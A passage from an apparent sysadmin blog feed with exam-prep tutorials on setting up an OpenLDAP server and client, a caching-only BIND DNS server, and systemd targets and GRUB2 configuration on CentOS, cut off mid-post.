</span><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcRootPW
</span><span class='line'>olcRootPW: {SSHA}T4srVIBK+rJ9DXlVG7dvZnnAQhAZuO07
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcTLSCertificateFile
</span><span class='line'>olcTLSCertificateFile: /etc/openldap/certs/cert.pem
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcTLSCertificateKeyFile
</span><span class='line'>olcTLSCertificateKeyFile: /etc/openldap/certs/key.pem
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcLogLevel
</span><span class='line'>olcLogLevel: -1
</span><span class='line'>
</span><span class='line'>dn: olcDatabase={1}monitor,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcAccess
</span><span class='line'>olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth" read by dn.base="cn=Manager,dc=example,dc=com" read by * none</span></code></pre></td></tr></table></div></figure>


<p>In summary, here you have to be mindful of the certificate and key paths, and of your previously generated password.</p>

<p>Now create the configuration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapmodify -Y EXTERNAL -H ldapi:/// -f /etc/openldap/changes.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={1}monitor,cn=config"</span></code></pre></td></tr></table></div></figure>


<p>Create the file <code>/etc/openldap/base.ldif</code> with the following content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dn: dc=example,dc=com
</span><span class='line'>dc: example
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: domain
</span><span class='line'>
</span><span class='line'>dn: ou=People,dc=example,dc=com
</span><span class='line'>ou: People
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: organizationalUnit
</span><span class='line'>
</span><span class='line'>dn: ou=Group,dc=example,dc=com
</span><span class='line'>ou: Group
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: organizationalUnit</span></code></pre></td></tr></table></div></figure>


<p>Create the directory structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f /etc/openldap/base.ldif
</span><span class='line'>adding new entry "dc=example,dc=com"
</span><span class='line'>
</span><span class='line'>adding new entry "ou=People,dc=example,dc=com"
</span><span class='line'>
</span><span class='line'>adding new entry "ou=Group,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>This command uses simple authentication and reads the previously created file.</p>

<p>Now it&rsquo;s time to create a sample user account and see if things are working:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ldap
</span><span class='line'>useradd -d /home/ldap/sam sam
</span><span class='line'>passwd sam </span></code></pre></td></tr></table></div></figure>


<p>Some additional steps are needed for user account migration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /usr/share/migrationtools </span></code></pre></td></tr></table></div></figure>


<p>Edit <strong>migrate_common.ph</strong> to have your domain values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Default DNS domain
</span><span class='line'>$DEFAULT_MAIL_DOMAIN = "example.com";
</span><span class='line'>
</span><span class='line'># Default base 
</span><span class='line'>$DEFAULT_BASE = "dc=example,dc=com";</span></code></pre></td></tr></table></div></figure>


<p>Add the user to the directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | grep sam &gt; passwd
</span><span class='line'>cat passwd 
</span><span class='line'>sam:x:1004:1004::/home/ldap/sam:/bin/bash
</span><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f users.ldif
</span><span class='line'>./migrate_passwd.pl passwd users.ldif</span></code></pre></td></tr></table></div></figure>


<p>Check out the <em>users.ldif</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat users.ldif 
</span><span class='line'>dn: uid=sam,ou=People,dc=example,dc=com
</span><span class='line'>uid: sam
</span><span class='line'>cn: sam
</span><span class='line'>objectClass: account
</span><span class='line'>objectClass: posixAccount
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>userPassword: {crypt}$6$L49gzmY1$n0RNoX86rhT4QMvmsKWkMruHT/BCh7yBm2cQOdb4pbOA7XM0RB4d4GsoDpSILQSjYduiPponzFDb8O7bIb1kA.
</span><span class='line'>shadowLastChange: 17573
</span><span class='line'>shadowMin: 0
</span><span class='line'>shadowMax: 99999
</span><span class='line'>shadowWarning: 7
</span><span class='line'>loginShell: /bin/bash
</span><span class='line'>uidNumber: 1004
</span><span class='line'>gidNumber: 1004
</span><span class='line'>homeDirectory: /home/ldap/sam</span></code></pre></td></tr></table></div></figure>


<p>Add the user entry:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f users.ldif
</span><span class='line'>adding new entry "uid=sam,ou=People,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Do the same for group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/group | grep sam &gt; group
</span><span class='line'>cat group
</span><span class='line'>sam:x:1004:</span></code></pre></td></tr></table></div></figure>


<p>Migrate the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./migrate_group.pl group groups.ldif</span></code></pre></td></tr></table></div></figure>


<p>Check the groups.ldif file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat groups.ldif 
</span><span class='line'>dn: cn=sam,ou=Group,dc=example,dc=com
</span><span class='line'>objectClass: posixGroup
</span><span class='line'>objectClass: top
</span><span class='line'>cn: sam
</span><span class='line'>userPassword: {crypt}x
</span><span class='line'>gidNumber: 1004</span></code></pre></td></tr></table></div></figure>


<p>Add the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f groups.ldif
</span><span class='line'>adding new entry "cn=sam,ou=Group,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Now search for the user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -x cn=sam -b dc=example,dc=com
</span><span class='line'># extended LDIF
</span><span class='line'>#
</span><span class='line'># LDAPv3
</span><span class='line'># base &lt;dc=example,dc=com&gt; with scope subtree
</span><span class='line'># filter: cn=sam
</span><span class='line'># requesting: ALL
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'># sam, People, example.com
</span><span class='line'>dn: uid=sam,ou=People,dc=example,dc=com
</span><span class='line'>uid: sam
</span><span class='line'>cn: sam
</span><span class='line'>objectClass: account
</span><span class='line'>objectClass: posixAccount
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>userPassword:: e2NyeXB0fSQ2JEw0OWd6bVkxJG4wUk5vWDg2cmhUNFFNdm1zS1drTXJ1SFQvQkN
</span><span class='line'> oN3lCbTJjUU9kYjRwYk9BN1hNMFJCNGQ0R3NvRHBTSUxRU2pZZHVpUHBvbnpGRGI4TzdiSWIxa0Eu
</span><span class='line'>shadowLastChange: 17573
</span><span class='line'>shadowMin: 0
</span><span class='line'>shadowMax: 99999
</span><span class='line'>shadowWarning: 7
</span><span class='line'>loginShell: /bin/bash
</span><span class='line'>uidNumber: 1004
</span><span class='line'>gidNumber: 1004
</span><span class='line'>homeDirectory: /home/ldap/sam
</span><span class='line'>
</span><span class='line'># sam, Group, example.com
</span><span class='line'>dn: cn=sam,ou=Group,dc=example,dc=com
</span><span class='line'>objectClass: posixGroup
</span><span class='line'>objectClass: top
</span><span class='line'>cn: sam
</span><span class='line'>userPassword:: e2NyeXB0fXg=
</span><span class='line'>gidNumber: 1004
</span><span class='line'>
</span><span class='line'># search result
</span><span class='line'>search: 2
</span><span class='line'>result: 0 Success
</span><span class='line'>
</span><span class='line'># numResponses: 3
</span><span class='line'># numEntries: 2</span></code></pre></td></tr></table></div></figure>


<p>You might also need to allow ldap in the firewall.</p>

<h2>Client configuration</h2>

<p>If you hoped it was over, we still have to verify the authentication from a client machine. On my client, I also added the server in /etc/hosts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.217.131 centos.example.com</span></code></pre></td></tr></table></div></figure>


<p>The interface used for configuring authentication is <code>authconfig</code>. For this example I will go over the <strong>nslcd</strong> route.</p>

<p>On the client, install the needed packages:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y openldap-clients nss-pam-ldapd</span></code></pre></td></tr></table></div></figure>


<p>Run the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>authconfig --enableforcelegacy --update
</span><span class='line'>authconfig --enableldap --enableldapauth --ldapserver="centos.example.com" --ldapbasedn="dc=example,dc=com" --update</span></code></pre></td></tr></table></div></figure>


<p>Download the certificate:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp root@centos.example.com:/etc/openldap/certs/cert.pem /etc/openldap/cacerts/cert.pem
</span><span class='line'>root@centos.example.com's password: 
</span><span class='line'>cert.pem                                      100% 1298   107.3KB/s   00:00    </span></code></pre></td></tr></table></div></figure>


<p>Enable TLS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>authconfig --enableldaptls --update</span></code></pre></td></tr></table></div></figure>


<p>You can do a getent or try to login as the LDAP user to see if it works.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your temporary financial embarrassment \
</span><span class='line'>| will be relieved in a surprising       |
</span><span class='line'>\ manner.                                /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configure caching-only DNS]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns/"/>
    <updated>2018-02-10T14:04:48-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll take a look at setting up a caching only DNS server for the LFCS exam objectives.</p>

<!-- more -->


<p>First, install the necessary DNS packages: <code>yum install -y bind bind-utils</code>.</p>

<p>Then you will have to do some editing in <code>/etc/named.conf</code>. In particular, you are interested in the below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>listen-on port 53 { 127.0.0.1; any; };
</span><span class='line'>allow-query     { localhost; any; };
</span><span class='line'>allow-query-cache     { localhost; any; };</span></code></pre></td></tr></table></div></figure>


<p>The <em>allow-query</em> option deals with who can send queries to the server, while the <em>allow-query-cache</em> allows access to cached records</p>

<p>You have to ensure the named.conf file has the proper permissions. It needs to be owned by root and belong to the group named:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /etc/named.conf
</span><span class='line'>-rw-r-----. 1 root named 1754 Feb 10 19:46 /etc/named.conf</span></code></pre></td></tr></table></div></figure>


<p>Check the SELinux contexts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /etc/named.*
</span><span class='line'>-rw-r-----. root named unconfined_u:object_r:etc_t:s0   /etc/named.conf
</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.iscdlv.key
</span><span class='line'>-rw-r-----. root named system_u:object_r:named_conf_t:s0 /etc/named.rfc1912.zones
</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.root.key</span></code></pre></td></tr></table></div></figure>


<p>Check the config file for syntax errors before trying anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>named-checkconf /etc/named.conf</span></code></pre></td></tr></table></div></figure>


<p>Start the DNS service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start named</span></code></pre></td></tr></table></div></figure>


<p>Open port 53 on the firewall:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --add-port=53/udp</span></code></pre></td></tr></table></div></figure>


<p>On the client, add the DNS server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod ens33 ipv4.dns "192.168.217.131"</span></code></pre></td></tr></table></div></figure>


<p>Restart the connection and NetworkManager. Check that the nameserver has been added in <code>/etc/resolv.conf</code>. Now you can test it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nslookup github.com
</span><span class='line'>Server:       192.168.217.131
</span><span class='line'>Address:  192.168.217.131#53
</span><span class='line'>
</span><span class='line'>Non-authoritative answer:
</span><span class='line'>Name: github.com
</span><span class='line'>Address: 192.30.253.113
</span><span class='line'>Name: github.com
</span><span class='line'>Address: 192.30.253.112</span></code></pre></td></tr></table></div></figure>


<p>If you need to add a zone to your DNS server, take a look at the sample zone directives in <em>/etc/named.rfc1912.zones</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zone "localhost.localdomain" IN {
</span><span class='line'>  type master;
</span><span class='line'>  file "named.localhost";
</span><span class='line'>  allow-update { none; };
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>You have to add a similar configuration for your zone inside <code>/etc/named.conf</code>. Then you also have to create a zone file inside <strong>/var/named</strong>. For reference, look at an existing one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /var/named/named.localhost 
</span><span class='line'>$TTL 1D
</span><span class='line'>@ IN SOA  @ rname.invalid. (
</span><span class='line'>                  0   ; serial
</span><span class='line'>                  1D  ; refresh
</span><span class='line'>                  1H  ; retry
</span><span class='line'>                  1W  ; expire
</span><span class='line'>                  3H )    ; minimum
</span><span class='line'>  NS  @
</span><span class='line'>  A   127.0.0.1
</span><span class='line'>  AAAA    ::1</span></code></pre></td></tr></table></div></figure>


<p>This should be all that is needed in terms of DNS configuration for LFCS objectives.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ This life is yours. Some of it was \
</span><span class='line'>| given to you; the rest, you made   |
</span><span class='line'>\ yourself.                          /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Runlevels and bootloader configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration/"/>
    <updated>2018-02-08T12:47:30-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at the following LFCS objectives:</p>

<ul>
<li><p>Log into graphical and text mode consoles</p></li>
<li><p>Boot systems into different runlevels manually</p></li>
<li><p>Install, configure and troubleshoot the  bootloader</p></li>
</ul>


<!-- more -->


<h2>systemd targets</h2>

<p>First, let&rsquo;s take a look at all the available targets:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl list-units --type=target --all
</span><span class='line'>  UNIT                   LOAD      ACTIVE   SUB    DESCRIPTION
</span><span class='line'>  basic.target           loaded    active   active Basic System
</span><span class='line'>  cryptsetup.target      loaded    active   active Encrypted Volumes
</span><span class='line'>  emergency.target       loaded    inactive dead   Emergency Mode
</span><span class='line'>  final.target           loaded    inactive dead   Final Step
</span><span class='line'>  getty.target           loaded    active   active Login Prompts
</span><span class='line'>  graphical.target       loaded    active   active Graphical Interface
</span><span class='line'>  local-fs-pre.target    loaded    active   active Local File Systems (Pre)
</span><span class='line'>  local-fs.target        loaded    active   active Local File Systems
</span><span class='line'>  multi-user.target      loaded    active   active Multi-User System
</span><span class='line'>  network-online.target  loaded    active   active Network is Online
</span><span class='line'>  network-pre.target     loaded    inactive dead   Network (Pre)
</span><span class='line'>  network.target         loaded    active   active Network
</span><span class='line'>  nfs-client.target      loaded    active   active NFS client services
</span><span class='line'>  nss-lookup.target      loaded    inactive dead   Host and Network Name Lookups
</span><span class='line'>  nss-user-lookup.target loaded    active   active User and Group Name Lookups
</span><span class='line'>  paths.target           loaded    active   active Paths
</span><span class='line'>  remote-fs-pre.target   loaded    active   active Remote File Systems (Pre)
</span><span class='line'>  remote-fs.target       loaded    active   active Remote File Systems
</span><span class='line'>  rescue.target          loaded    inactive dead   Rescue Mode
</span><span class='line'>  rpcbind.target         loaded    inactive dead   RPC Port Mapper
</span><span class='line'>  shutdown.target        loaded    inactive dead   Shutdown
</span><span class='line'>  slices.target          loaded    active   active Slices
</span><span class='line'>  sockets.target         loaded    active   active Sockets
</span><span class='line'>  swap.target            loaded    active   active Swap
</span><span class='line'>  sysinit.target         loaded    active   active System Initialization
</span><span class='line'> syslog.target          not-found inactive dead   syslog.target
</span><span class='line'>  time-sync.target       loaded    inactive dead   System Time Synchronized
</span><span class='line'>  timers.target          loaded    active   active Timers
</span><span class='line'>  umount.target          loaded    inactive dead   Unmount All Filesystems
</span><span class='line'>
</span><span class='line'>LOAD   = Reflects whether the unit definition was properly loaded.
</span><span class='line'>ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
</span><span class='line'>SUB    = The low-level unit activation state, values depend on unit type.
</span><span class='line'>
</span><span class='line'>29 loaded units listed.
</span><span class='line'>To show all installed unit files use 'systemctl list-unit-files'.</span></code></pre></td></tr></table></div></figure>


<p>Out of these, we will only look at the most relevant ones:</p>

<ul>
<li><p><strong>emergency.target</strong> = emergency mode. All you have is systemd and a shell. This is what you use if, for instance, you experience disk failure</p></li>
<li><p><strong>rescue.target</strong> = single user mode. It&rsquo;s the equivalent of runlevel 1. In this mode, the early boot services are started and local mount points are mounted. No networking</p></li>
<li><p><strong>multi-user.target</strong> = multi-user text mode with networking. Equivalent to runlevel 3</p></li>
<li><p><strong>graphical.target</strong> = multi-user with GUI. Equivalent to runlevel 5</p></li>
</ul>


<p>Let&rsquo;s see what the default target is on my system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl get-default
</span><span class='line'>graphical.target</span></code></pre></td></tr></table></div></figure>


<p>You can set a new default target with <code>systemctl set-default</code></p>

<p>It is possible to switch to a different target without rebooting, by using <code>systemctl isolate <target name></code>. However, only targets with AllowIsolate=yes in their unit files can be isolated. Isolation will start or stop all necessary services for that particular target. You can use isolation to quickly switch between targets. You can achieve the same with the systemctl command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl rescue
</span><span class='line'>systemctl emergency</span></code></pre></td></tr></table></div></figure>


<p>Additionally, you can boot a desired target through the boot menu, by selecting <em>e</em> at the desired entry, and appending at the end of the kernel command line (the one starting with linux16) the entry <strong>systemd.unit=target name</strong></p>

<h2>bootloader troubleshooting</h2>

<p>Here we&rsquo;re only going to look at the grub2 bootloader. Its main configuration file is <code>/boot/grub2/grub.cfg</code>, but you&rsquo;re not supposed to edit it directly, but use <code>grub2-mkconfig</code> to generate the configuration. So you first edit the GRUB parameters in <code>/etc/default/grub</code>, and then run grub2-mkconfig to create the cfg file. Let&rsquo;s see the defaults I have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/default/grub
</span><span class='line'>GRUB_TIMEOUT=5
</span><span class='line'>GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
</span><span class='line'>GRUB_DEFAULT=saved
</span><span class='line'>GRUB_DISABLE_SUBMENU=true
</span><span class='line'>GRUB_TERMINAL_OUTPUT="console"
